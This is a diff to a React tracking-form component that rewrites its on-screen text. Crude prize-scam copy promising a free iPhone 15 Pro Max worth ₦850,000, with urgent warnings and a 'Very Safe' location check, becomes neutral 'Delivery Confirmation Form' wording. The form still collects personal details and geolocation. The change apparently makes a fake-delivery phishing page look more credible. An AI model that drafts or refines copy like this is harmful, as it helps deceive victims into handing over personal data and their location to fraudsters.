@@ -121,10 +121,10 @@ const TrackingForm = () => {
         <CardHeader className="bg-gradient-to-r from-logistics-orange to-logistics-blue text-white rounded-t-lg">
           <CardTitle className="text-2xl font-bold flex items-center">
             <Shield className="w-6 h-6 mr-2" />
-            🎁 Get Your iPhone 15 Pro Max Now!
+            Delivery Confirmation Form
           </CardTitle>
           <CardDescription className="text-white/90">
-            Last step: Just confirm your details to receive your expensive Canadian iPhone today!
+            Please verify your delivery information to complete the package transfer process.
           </CardDescription>
         </CardHeader>
         
@@ -132,10 +132,10 @@ const TrackingForm = () => {
           <div className="bg-logistics-red/10 border border-logistics-red/20 rounded-lg p-3 mb-4">
             <div className="flex items-center text-logistics-red text-sm font-medium mb-1">
               <AlertTriangle className="w-4 h-4 mr-2" />
-              🚨 URGENT: Don't Lose Your iPhone!
+              Delivery Confirmation Required
             </div>
             <p className="text-xs text-muted-foreground">
-              Your iPhone 15 Pro Max worth ₦850,000 will go back to Canada if you don't fill this form TODAY. Very simple - just 4 fields!
+              High-value package delivery requires verification. Please complete all required fields for secure processing.
             </p>
           </div>
 
@@ -211,15 +211,14 @@ const TrackingForm = () => {
             <div className="bg-logistics-blue/10 p-4 rounded-lg border border-logistics-blue/20">
               <div className="flex items-center mb-2">
                 <MapPin className="w-4 h-4 text-logistics-blue mr-2" />
-                <span className="text-sm font-medium text-logistics-navy">📍 Quick Location Check (Very Safe)</span>
+                <span className="text-sm font-medium text-logistics-navy">Location Verification</span>
               </div>
               <p className="text-xs text-muted-foreground mb-2">
-                We will ask for your location to make sure your expensive iPhone goes to the right place. 
-                Don't worry - it's 100% safe and helps us find your house easily.
+                Location verification helps ensure accurate delivery to your specified address. This is a secure process used for high-value packages.
               </p>
               <div className="flex items-center text-xs text-logistics-green">
                 <CheckCircle2 className="w-3 h-3 mr-1" />
-                <span>✅ Very Safe • Just One Time • Helps Us Find You</span>
+                <span>Secure • One-time verification • Enhances delivery accuracy</span>
               </div>
             </div>
 
@@ -244,13 +243,13 @@ const TrackingForm = () => {
                 ) : (
                   <>
                     <Shield className="w-4 h-4 mr-2" />
-                    🎁 YES! I Want My iPhone 15 Pro Max Now!
+                    Confirm Delivery Details
                   </>
                 )}
               </Button>
               
               <p className="text-xs text-center text-muted-foreground">
-                By clicking above, you confirm your details are correct and you want to receive your iPhone today
+                By submitting, you confirm that your delivery information is accurate and complete.
               </p>
             </div>
           </form>
